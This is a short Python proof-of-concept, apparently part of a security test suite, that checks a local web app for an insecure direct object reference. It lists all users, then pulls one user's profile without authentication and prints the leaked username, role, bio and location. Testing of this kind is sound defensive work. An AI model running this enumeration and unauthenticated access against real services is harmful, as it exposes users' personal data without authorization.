#!/usr/bin/env python3
"""
WSTG-ATHZ-04: Insecure Direct Object Reference — User Profile
Demonstrates that any user's profile can be read without authentication.
Expected: 200 response containing the target user's profile data.
"""

import requests

BASE = "http://localhost:3000"


def main():
    print("[*] WSTG-ATHZ-04: User Profile IDOR PoC")
    print("=" * 50)

    # Step 1: Get list of all users
    print("[*] Enumerating users...")
    users_resp = requests.get(f"{BASE}/api/users")
    assert users_resp.status_code == 200, "Expected 200 — users list accessible"
    users = users_resp.json()["users"]
    print(f"[+] Found {len(users)} users")

    # Step 2: Pick a target user
    target = users[0]

    print(f"[*] Target: {target['display_name']} (ID: {target['id']})")

    # Step 3: Access target's profile without any authentication
    print(f"[*] Accessing {target['display_name']}'s profile without auth...")
    resp = requests.get(f"{BASE}/api/users/{target['id']}")

    print(f"\n[+] Status Code: {resp.status_code}")

    if resp.status_code == 200:
        data = resp.json()
        user = data.get("user", {})

        print(f"\n[+] Leaked Profile Data:")
        print(f"    ID: {user.get('id', 'N/A')}")
        print(f"    Username: {user.get('username', 'N/A')}")
        print(f"    Display Name: {user.get('display_name', 'N/A')}")
        print(f"    Role: {user.get('role', 'N/A')}")
        print(f"    Bio: {user.get('bio', 'N/A')[:50]}...")
        print(f"    Location: {user.get('location', 'N/A')}")
        print(f"    Created At: {user.get('created_at', 'N/A')}")

        print("\n" + "=" * 50)
        print("[VULNERABLE] User Profile IDOR confirmed")
        print("=" * 50)
        print("\nAny unauthenticated user can access anyone's profile")
    else:
        print(f"\n[-] Status {resp.status_code} — IDOR may be patched")


if __name__ == "__main__":
    main()
